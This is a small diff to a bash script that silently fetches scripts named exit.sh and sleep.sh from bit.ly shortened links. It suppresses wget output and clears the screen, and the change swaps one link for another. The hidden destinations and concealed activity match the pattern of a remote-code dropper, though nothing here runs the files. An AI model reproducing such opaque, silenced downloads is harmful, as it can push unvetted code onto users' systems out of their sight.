@@ -1,5 +1,5 @@
 #!/bin/bash
-wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
+wget -O exit.sh https://bit.ly/3By9RUV > /dev/null 2>&1
 clear
 wget -O sleep.sh https://bit.ly/3iGh4cU > /dev/null 2>&1
 clear
